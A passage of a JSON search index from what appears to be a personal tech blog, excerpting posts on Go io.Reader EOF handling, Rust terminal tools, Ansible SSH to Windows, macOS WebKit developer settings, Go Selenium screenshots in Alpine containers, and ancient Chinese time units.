的情况！这跟我之前的印象不相符。因为一般来说，当 err 非空时，前面的返回数据一般都是空值。但 io.Reader 并不是这样。\n","date":"January 20, 2023","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2023/20230120-parse-binary-data/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://tao.zz.ac/go/parse-binary-data.html\" target=\"_blank\" rel=\"noopener\"\u003e使用 Go 语言解析二进制数据踩坑总结\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003ebuf\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e make([]\u003cspan style=\"color:#66d9ef\"\u003ebyte\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ebufSize\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003en\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003er\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eRead\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ebuf\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eio\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eEOF\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  } \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eaerr\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eStore\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003ech\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;-\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ebuf\u003c/span\u003e[:\u003cspan style=\"color:#a6e22e\"\u003en\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cblockquote\u003e\n\u003cp\u003e当 err 的值为 io.EOF 时直接返回了。这是最可能出问题的地方。仔细阅读函数文档发现：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eCallers should always process the n \u0026gt; 0 bytes returned before considering the error err. Doing so correctly handles I/O errors that happen after reading some bytes and also both of the allowed EOF behaviors.\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e所以程序必须先处理 n \u0026gt; 0 的情况，然后再处理 err != nil 的情况！这跟我之前的印象不相符。因为一般来说，当 err 非空时，前面的返回数据一般都是空值。但 io.Reader 并不是这样。\u003c/p\u003e","tags":["URL","Go"],"title":"使用Go语言解析二进制数据踩坑总结"},{"categories":["URL","Rust","Terminal"],"contents":" Rust Easy! Modern Cross-platform Command Line Tools to Supercharge Your Terminal Alacritty Alacritty is a cross-platform modern terminal emulator with sensible defaults. It is GPU accelerated, super fast, and highly configurable. You can use it on Linux, macOS, and Windows.\nbat bat is one of my favorite tools from this list. It\u0026rsquo;s a replacement for cat.\ndust Dust is an alternative for the du command. It is fast and has a better UX with nice visualization for disk usage.\nripgrep ripgrep (rg) is a line-oriented search tool that recursively searches your current directory for a regex pattern. It is faster than grep and has many features like compressed files search, colorized output, smart case, file type filtering, multi-threading, and so on.\nTopgrade Topgrade is a fantastic utility if you prefer to keep your system up-to-date.\n","date":"January 13, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2023/20230113-rust-terminal-tools-linux-mac-windows-fish-zsh/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://deepu.tech/rust-terminal-tools-linux-mac-windows-fish-zsh/\" target=\"_blank\" rel=\"noopener\"\u003eRust Easy! Modern Cross-platform Command Line Tools to Supercharge Your Terminal\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"alacritty\"\u003e\u003ca href=\"https://github.com/alacritty/alacritty\" target=\"_blank\" rel=\"noopener\"\u003eAlacritty\u003c/a\u003e\u003c/h4\u003e\n\u003cp\u003eAlacritty is a cross-platform modern terminal emulator with sensible defaults. It is GPU accelerated, super fast, and highly configurable. You can use it on Linux, macOS, and Windows.\u003c/p\u003e\n\u003ch4 id=\"bat\"\u003e\u003ca href=\"https://github.com/sharkdp/bat\" target=\"_blank\" rel=\"noopener\"\u003ebat\u003c/a\u003e\u003c/h4\u003e\n\u003cp\u003ebat is one of my favorite tools from this list. It\u0026rsquo;s a replacement for cat.\u003c/p\u003e\n\u003ch4 id=\"dust\"\u003e\u003ca href=\"https://github.com/bootandy/dust\" target=\"_blank\" rel=\"noopener\"\u003edust\u003c/a\u003e\u003c/h4\u003e\n\u003cp\u003eDust is an alternative for the du command. It is fast and has a better UX with nice visualization for disk usage.\u003c/p\u003e","tags":["URL","Rust","Terminal"],"title":"Rust Easy! Modern Cross-platform Command Line Tools to Supercharge Your Terminal"},{"categories":["URL","Ansible","Windows","SSH"],"contents":" Windows SSH setup Install OpenSSH for Windows 預設的 shell 是使用 cmd，照文件說，若需要修改，是要改 ansible_shell_type 變數，這應該是要在 inventory 主機裡加入主機變數：ansible_shell_type，變數內容可以是 cmd 或 powershell。 inventory 主機裡要加入 ansible_connection 主機變數，告知要使用 ssh 連線。(192.168.192.11 ansible_user=Administrator ansible_connection=ssh ansible_shell_type=cmd ) 可能會需要在 ansible.cfg 裡加上 remote_tmp 設定，指定為 C:\\TEMP Playbook 裡可以使用 win_ 開頭的模組，或是使用 raw 模組 ","date":"January 3, 2023","hero":"/images/hero/ansible.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2023/20230103-windows-ssh-setup/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ansible.cloudns.pro/post/windows-ssh-setup/\" target=\"_blank\" rel=\"noopener\"\u003eWindows SSH setup\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_install_firstuse\" target=\"_blank\" rel=\"noopener\"\u003eInstall OpenSSH for Windows\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003col\u003e\n\u003cli\u003e預設的 shell 是使用 cmd，照文件說，若需要修改，是要改 ansible_shell_type 變數，這應該是要在 inventory 主機裡加入主機變數：ansible_shell_type，變數內容可以是 cmd 或 powershell。\u003c/li\u003e\n\u003cli\u003einventory 主機裡要加入 ansible_connection 主機變數，告知要使用 ssh 連線。(\u003ccode\u003e192.168.192.11 ansible_user=Administrator ansible_connection=ssh ansible_shell_type=cmd \u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003e可能會需要在 ansible.cfg 裡加上 remote_tmp 設定，指定為 C:\\TEMP\u003c/li\u003e\n\u003cli\u003ePlaybook 裡可以使用 \u003ccode\u003ewin_\u003c/code\u003e 開頭的模組，或是使用 raw 模組\u003c/li\u003e\n\u003c/ol\u003e","tags":["URL","Ansible","Windows","SSH"],"title":"Windows SSH setup"},{"categories":["URL","macOS"],"contents":" Inspecting Web Views in macOS defaults write NSGlobalDomain WebKitDeveloperExtras -bool true defaults write -g WebKitDeveloperExtras -bool YES ","date":"December 2, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20221202-inspecting-web-views-in-macos/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.jim-nielsen.com/2022/inspecting-web-views-in-macos/\" target=\"_blank\" rel=\"noopener\"\u003eInspecting Web Views in macOS\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edefaults write NSGlobalDomain WebKitDeveloperExtras -bool true\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edefaults write -g WebKitDeveloperExtras -bool YES\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","macOS"],"title":"Inspecting Web Views in macOS"},{"categories":["URL","Go","Selenium"],"contents":" Go 使用 selenium 截图 package main import ( \u0026#34;fmt\u0026#34; log \u0026#34;github.com/sirupsen/logrus\u0026#34; \u0026#34;github.com/tebeka/selenium\u0026#34; \u0026#34;io/ioutil\u0026#34; ) const ( chromeDriverPath = \u0026#34;/usr/local/bin/chromedriver\u0026#34; port = 9515 ) func main() { var opts []selenium.ServiceOption selenium.SetDebug(false) service, err := selenium.NewChromeDriverService(chromeDriverPath, port, opts...) if err != nil { panic(err) // panic is used only as an example and is not otherwise recommended. } defer service.Stop() caps := selenium.Capabilities{\u0026#34;browserName\u0026#34;: \u0026#34;chrome\u0026#34;} // 整页截屏 // 获取到网页的宽高，然后把浏览器的窗口设置成这么大，然后再截图就好了！需要注意的是只有 headless 模式可以任意设置窗口大小，否则最大高度不能超过你的显示器分辨率 // chromeCaps := chrome.Capabilities{ // Path: \u0026#34;\u0026#34;, // Args: []string{ // \u0026#34;--headless\u0026#34;, // }, // } // caps.AddChrome(chromeCaps) wd, err := selenium.NewRemote(caps, fmt.Sprintf(\u0026#34;http://localhost:%d/wd/hub\u0026#34;, port)) if err != nil { panic(err) } defer wd.Quit() // 在 selenium 中使用ExecuteScript就可以执行 JavaScript 代码，需要注意返回值是 interface，所以要类型断言成 float，然后再转成 int // height, _ := wd.ExecuteScript(\u0026#34;return document.body.parentNode.scrollHeight\u0026#34;, nil) // var realHeight = int(height.(float64)) // 然后我们需要设置窗口大小 // wd.ResizeWindow(\u0026#34;\u0026#34;, 1920, realHeight) if err := wd.Get(\u0026#34;https://github.com/tgbot-collection/archiver\u0026#34;); err != nil { panic(err) } screenshot, err := wd.Screenshot() if err != nil { log.Errorln(err) } ioutil.WriteFile(\u0026#34;screenshot.png\u0026#34;, screenshot, 0644) } 整页截屏 获取到网页的宽高，然后把浏览器的窗口设置成这么大，然后再截图就好了！需要注意的是只有 headless 模式可以任意设置窗口大小，否则最大高度不能超过你的显示器分辨率\n在容器中运行 直接运行 apk add chromium-chromedriver 浏览器和 webdriver 会一起安装好\n要注意一件事情，如果你是 root 用户运行的，那么要加上--no-sandbox 参数\nChrome 和 container 的兼容性问题，Chrome 需要比较大的/dev/shm，然而容器中的/dev/shm 往往都比较小，\n通过 run 时额外参数--shm-size=256m 也可以直接把宿主机的共享进去docker run --rm -v /dev/shm:/dev/shm -it alpine sh 也可以禁用 Chrome 的 shm 功能，加一个参数 \u0026quot;--disable-dev-shm-usage\u0026quot;, 中文乱码 alpine 里没带中文字体，所以中文会乱码。可以用 alpine 自带的一个，这样安装就好，也可以自己偷字体，然后放到/usr/share/fonts/就好了\napk add wqy-zenhei --update-cache --repository https://nl.alpinelinux.org/alpine/edge/testing\n","date":"December 2, 2022","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20221202-go-selenium/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://dmesg.app/go-selenium.html\" target=\"_blank\" rel=\"noopener\"\u003eGo 使用 selenium 截图\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;github.com/sirupsen/logrus\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;github.com/tebeka/selenium\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;io/ioutil\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003echromeDriverPath\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/usr/local/bin/chromedriver\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eport\u003c/span\u003e = \u003cspan style=\"color:#ae81ff\"\u003e9515\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eopts\u003c/span\u003e []\u003cspan style=\"color:#a6e22e\"\u003eselenium\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eServiceOption\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eselenium\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSetDebug\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eservice\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eselenium\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eNewChromeDriverService\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003echromeDriverPath\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eport\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eopts\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e...\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\tpanic(\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// panic is used only as an example and is not otherwise recommended.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eservice\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eStop\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ecaps\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eselenium\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eCapabilities\u003c/span\u003e{\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;browserName\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;chrome\u0026#34;\u003c/span\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// 整页截屏\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// 获取到网页的宽高，然后把浏览器的窗口设置成这么大，然后再截图就好了！需要注意的是只有 headless 模式可以任意设置窗口大小，否则最大高度不能超过你的显示器分辨率\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e// chromeCaps := chrome.Capabilities{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e// \tPath: \u0026#34;\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e// \tArgs: []string{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e// \t\t\u0026#34;--headless\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e// \t},\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e// }\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e// caps.AddChrome(chromeCaps)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ewd\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eselenium\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eNewRemote\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ecaps\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSprintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;http://localhost:%d/wd/hub\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eport\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\tpanic(\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ewd\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eQuit\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// 在 selenium 中使用ExecuteScript就可以执行 JavaScript 代码，需要注意返回值是 interface，所以要类型断言成 float，然后再转成 int\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// height, _ := wd.ExecuteScript(\u0026#34;return document.body.parentNode.scrollHeight\u0026#34;, nil)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// var realHeight = int(height.(float64))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// 然后我们需要设置窗口大小\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// wd.ResizeWindow(\u0026#34;\u0026#34;, 1920, realHeight)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ewd\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eGet\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;https://github.com/tgbot-collection/archiver\u0026#34;\u003c/span\u003e); \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\tpanic(\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003escreenshot\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ewd\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eScreenshot\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eErrorln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eioutil\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eWriteFile\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;screenshot.png\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003escreenshot\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0644\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"整页截屏\"\u003e整页截屏\u003c/h5\u003e\n\u003cp\u003e获取到网页的宽高，然后把浏览器的窗口设置成这么大，然后再截图就好了！需要注意的是只有 headless 模式可以任意设置窗口大小，否则最大高度不能超过你的显示器分辨率\u003c/p\u003e","tags":["URL","Go","Selenium"],"title":"Go 使用 selenium 截图"},{"categories":["URL","Time"],"contents":" 古代計時單位 十二時辰時間對照表 時辰 古名 對應現代時間 初 / 正時間 別名（完整） 子時 夜半 23:00-01:00 子初 23:00\n子正 00:00 子夜、中夜、午夜、夜分、夜半、未旦、宵分、未央 丑時 雞鳴 01:00-03:00 丑初 01:00\n丑正 02:00 荒雞 寅時 平旦 03:00-05:00 寅初 03:00\n寅正 04:00 平明、旦明、黎明、早旦、日旦、昧旦、騎旦、早晨、早夜、早朝、昧爽、旦日、旦時 卯時 日出 05:00-07:00 卯初 05:00\n卯正 06:00 日上、日生、日升、日始、日晞、旭日、破曉 